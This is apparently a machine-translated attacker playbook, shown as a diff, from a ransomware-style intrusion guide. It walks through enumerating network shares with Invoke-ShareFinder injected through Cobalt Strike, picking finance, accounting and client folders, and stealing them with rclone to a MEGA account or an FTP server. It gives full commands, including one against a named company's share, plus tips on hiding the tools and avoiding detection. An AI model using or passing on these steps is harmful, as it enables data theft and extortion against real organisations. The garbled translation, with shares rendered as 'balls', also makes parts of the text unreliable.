@@ -1,0 +1,37 @@
+1) After we raised the rights, found the Admin Domain, we pull the sessions into cobalt
+2) We put on the YES token and Remove the balls in this way:
+    * powershell-import - upload ShareFinder there as usual and give the following command -
+psinject 7080 x64 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt
+
+Next, we study the removed balls, we are interested in
+* Finance docks
+* Accounting
+* Aichi
+* Clients
+* Projects
+And so on, it all depends on what our target is doing.
+
+Next, we do the following> here is the Manual from Diablo, all lego is accessible and understandable
+
+Rclone
+in order to start downloading via rclone you need to create a config
+to create a config you need to open cmd go to the directory where rclone.exe is located
+run rclone.exe using the command: rclone config
+then select new remote in the menu that appears
+we call it mega then we enter mega again
+after that we enter the mail address mega after he asks for his pass to enter or generate we choose our letter 'Y'
+the pass will not appear on insertion, however it is inserted there anyway
+after creating the config, we are thrown into the main menu and we exit the clone.
+then we enter this command rclone.exe config show it will show the config itself that we created
+we copy it and create the rclone.conf file where we put this info.
+after we found the balls we are interested in, we load the exe and the config on the target machine with the rights, we hide the config and the executable so that they are not found
+go to the executable directory and give the command: shell rclone.exe copy "\\ envisionpharma.com \ IT \ KLSHARE" Mega: Finanse -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+where: \\ envisionpharma.com \ IT \ KLSHARE are balls
+Mega: Finanse the location of the files in the mega (you can create a folder in the mega yourself, you just need to specify it here)
+streams 12 --transfers 12 is the number of streams that pump to the maximum (12) I do not recommend as you can easily get burned
+
+
+
+shell rclone.exe copy "\\PETERLENOVO.wist.local\Users" ftp1:uploads/Users/ -q --ignore-existing --auto-confirm --multi-thread-streams 3 --transfers 3 - here's an example in in this case at FTP
+
+!!! RKLON ITSELF WEIGHT OF THE ORDER 50MB, THE LINK TO IT WILL BE BELOW THE POST !!!
